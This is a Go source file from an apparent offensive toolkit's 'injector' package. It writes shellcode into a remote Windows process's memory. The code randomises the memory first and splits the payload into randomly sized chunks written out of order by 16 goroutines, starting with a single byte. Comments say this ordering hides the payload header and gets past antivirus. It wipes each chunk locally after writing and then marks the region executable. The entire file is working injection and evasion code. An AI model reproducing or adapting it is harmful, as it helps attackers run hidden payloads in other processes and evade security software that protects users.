package injector

import (
	"context"
	"sync"
	"time"

	"golang.org/x/sys/windows"

	"project/internal/module/windows/api"
	"project/internal/random"
	"project/internal/security"
	"project/internal/xpanic"
)

type memItem struct {
	b    []byte  // data chunk
	addr uintptr // start address
}

type memWriter struct {
	// input parameters
	pHandle   windows.Handle
	memAddr   uintptr
	memory    []byte
	size      uintptr
	chunkSize int

	rand     *random.Rand
	memoryCh chan *memItem

	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup
}

func (mw *memWriter) Write() error {
	// set read write
	doneVP := security.SwitchThreadAsync()
	old := new(uint32)
	err := api.VirtualProtectEx(mw.pHandle, mw.memAddr, mw.size, windows.PAGE_READWRITE, old)
	if err != nil {
		return err
	}
	doneWPM := security.SwitchThreadAsync()
	// write random data
	mw.rand = random.NewRand()
	_, err = api.WriteProcessMemory(mw.pHandle, mw.memAddr, mw.rand.Bytes(int(mw.size)))
	if err != nil {
		return err
	}
	// set context
	mw.memoryCh = make(chan *memItem, mw.chunkSize)
	mw.ctx, mw.cancel = context.WithTimeout(context.Background(), 3*time.Minute)
	defer mw.cancel()
	// start shellcode sender
	mw.wg.Add(1)
	go mw.sender()
	// start 16 shellcode writer
	for i := 0; i < 16; i++ {
		mw.wg.Add(1)
		go mw.writer()
	}
	// wait shellcode write finish
	mw.wg.Wait()
	// set shellcode page execute
	doneVP2 := security.SwitchThreadAsync()
	err = api.VirtualProtectEx(mw.pHandle, mw.memAddr, mw.size, windows.PAGE_EXECUTE, old)
	if err != nil {
		return err
	}
	// wait thread switch
	security.WaitSwitchThreadAsync(mw.ctx, doneVP, doneWPM, doneVP2)
	return nil
}

// sender is used to split memory and send to memoryCh.
func (mw *memWriter) sender() {
	defer mw.wg.Done()
	defer func() {
		if r := recover(); r != nil {
			xpanic.Log(r, "memWriter.sender")
		}
	}()
	rand := random.NewRand()
	splitSize := len(mw.memory) / 2
	// secondStage first copy for hide special header
	firstStage := mw.memory[:splitSize]
	secondStage := mw.memory[splitSize:]
	// first size must one byte for pass some AV
	nextSize := 1
	l := len(secondStage)
	for i := 0; i < l; {
		if i+nextSize > l {
			nextSize = l - i
		}
		item := &memItem{
			b:    secondStage[i : i+nextSize],
			addr: mw.memAddr + uintptr(splitSize+i),
		}
		select {
		case mw.memoryCh <- item:
		case <-mw.ctx.Done():
			return
		}
		i += nextSize
		nextSize = 1 + rand.Int(mw.chunkSize)
	}
	// then write first stage
	nextSize = 1
	l = len(firstStage)
	for i := 0; i < l; {
		if i+nextSize > l {
			nextSize = l - i
		}
		item := &memItem{
			b:    firstStage[i : i+nextSize],
			addr: mw.memAddr + uintptr(i),
		}
		select {
		case mw.memoryCh <- item:
		case <-mw.ctx.Done():
			return
		}
		i += nextSize
		nextSize = 1 + rand.Int(mw.chunkSize)
	}
	close(mw.memoryCh)
}

// writer is used to read shellcode chunk and write it to target process.
func (mw *memWriter) writer() {
	defer mw.wg.Done()
	defer func() {
		if r := recover(); r != nil {
			xpanic.Log(r, "memWriter.writer")
		}
	}()
	for {
		select {
		case item := <-mw.memoryCh:
			if item == nil {
				return
			}
			_, err := api.WriteProcessMemory(mw.pHandle, item.addr, item.b)
			if err != nil {
				mw.cancel()
				return
			}
			// cover origin shellcode at once
			security.CoverBytes(item.b)
		case <-mw.ctx.Done():
			return
		}
	}
}
